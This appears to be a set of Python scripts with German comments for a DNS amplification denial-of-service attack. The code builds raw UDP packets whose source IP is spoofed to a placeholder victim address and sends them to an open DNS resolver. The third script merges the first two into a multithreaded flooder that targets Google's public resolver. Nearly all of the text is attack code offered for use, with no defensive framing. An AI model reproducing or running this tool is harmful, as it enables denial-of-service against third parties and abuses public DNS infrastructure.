import random
import socket
import struct
import time

# Funktion zum Erzeugen der DNS-Anfrage
def create_dns_request(domain):
    # DNS Header
    transaction_id = random.randint(0, 65535)
    flags = 0x0100  # Standard Anfrage
    questions = 1  # Eine Frage
    answer_rrs = 0  # Keine Antworten
    authority_rrs = 0  # Keine Autorität
    additional_rrs = 0  # Keine zusätzlichen RRs

    # DNS Frage
    qname = b''.join([bytes(f'{part}', 'utf-8') + b'.' for part in domain.split('.')])
    qtype = 1  # A-Record (IPv4 Adresse)
    qclass = 1  # In-addr ARPA

    # DNS Anfrage Packet zusammenbauen
    packet = struct.pack('>HHHHHH', transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs)
    packet += qname + struct.pack('>HH', qtype, qclass)

    return packet

# Funktion zum Versenden einer DNS-Anfrage mit IP-Spoofing
def send_dns_request(target_ip, dns_server_ip, domain):
    # Erstelle die DNS-Anfrage
    request = create_dns_request(domain)

    # Erstelle einen Socket mit Raw-Socket, um die Quelle der Anfrage zu fälschen
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)

    # IP Header (IP-Spoofing, die Quell-IP wird auf die Ziel-IP gesetzt)
    source_ip = target_ip  # Die Quell-IP wird hier gefälscht
    dest_ip = dns_server_ip  # Die IP des DNS-Servers

    # UDP Header
    source_port = random.randint(1024, 65535)  # Zufälliger Quellport
    dest_port = 53  # DNS Port

    # Erstelle den IP Header
    ip_header = struct.pack('>BBHHHBBH4s4s', 
        69, 0, 28 + len(request), 54321, 0, 64, 17, 0, socket.inet_aton(source_ip), socket.inet_aton(dest_ip))

    # Erstelle den UDP Header
    udp_header = struct.pack('>HHHH', source_port, dest_port, len(request) + 8, 0)

    # Kombiniere IP-Header, UDP-Header und die DNS-Anfrage
    packet = ip_header + udp_header + request

    # Sende das Paket
    sock.sendto(packet, (dest_ip, 0))

# Beispielaufruf der Funktion
if __name__ == '__main__':
    victim_ip = 'ZIEL_IP_ADRESSE'  # IP-Adresse des Opfers
    dns_server_ip = 'DNS_SERVER_IP'  # IP-Adresse eines offenen DNS-Servers
    domain = 'example.com'  # Die Domain, die abgefragt wird

    # Anzahl der Anfragen, die gesendet werden sollen
    num_requests = 1000

    for _ in range(num_requests):
        send_dns_request(victim_ip, dns_server_ip, domain)
        time.sleep(0.1)  # Kurze Pause, um die Last zu simulieren

Code (2)

def dns_amplification_attack(ip, duration, threads):
    dns_query = (b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                 b"\x07example\x03com\x00\x00\x01\x00\x01")
    execute_attack(ip, 53, duration, threads, "dns_amplification", dns_query)







Code (3) aus 1 und 2

import random
import socket
import struct
import time
import threading

# Funktion zum Erzeugen der DNS-Anfrage (aus Code 2)
def create_dns_request(domain):
    transaction_id = random.randint(0, 65535)
    flags = 0x0100
    questions = 1
    answer_rrs = 0
    authority_rrs = 0
    additional_rrs = 0
    qname = b''.join([bytes(f'{part}', 'utf-8') + b'.' for part in domain.split('.')])
    qtype = 1
    qclass = 1
    packet = struct.pack('>HHHHHH', transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs)
    packet += qname + struct.pack('>HH', qtype, qclass)
    return packet

# Funktion zum Versenden der DNS-Anfrage (aus Code 2)
def send_dns_request(target_ip, dns_server_ip, domain):
    request = create_dns_request(domain)
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    source_ip = target_ip
    dest_ip = dns_server_ip
    source_port = random.randint(1024, 65535)
    dest_port = 53
    ip_header = struct.pack('>BBHHHBBH4s4s', 69, 0, 28 + len(request), 54321, 0, 64, 17, 0, socket.inet_aton(source_ip), socket.inet_aton(dest_ip))
    udp_header = struct.pack('>HHHH', source_port, dest_port, len(request) + 8, 0)
    packet = ip_header + udp_header + request
    sock.sendto(packet, (dest_ip, 0))

# Angriff ausführen mit Multithreading
def execute_attack(ip, port, duration, threads, attack_type, dns_query):
    start_time = time.time()
    def attack_thread():
        while time.time() - start_time < duration:
            send_dns_request(ip, "8.8.8.8", "example.com")  # Beispiel mit Google DNS als Angriffsserver

    # Erstelle die Threads
    for _ in range(threads):
        threading.Thread(target=attack_thread).start()

# DNS Amplification Attack Funktion
def dns_amplification_attack(ip, duration, threads):
    dns_query = (b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                 b"\x07example\x03com\x00\x00\x01\x00\x01")
    execute_attack(ip, 53, duration, threads, "dns_amplification", dns_query)

# Beispielaufruf
if __name__ == '__main__':
    victim_ip = 'ZIEL_IP_ADRESSE'
    duration = 10  # Sekunden
    threads = 50  # Anzahl der Threads
    dns_amplification_attack(victim_ip, duration, threads)
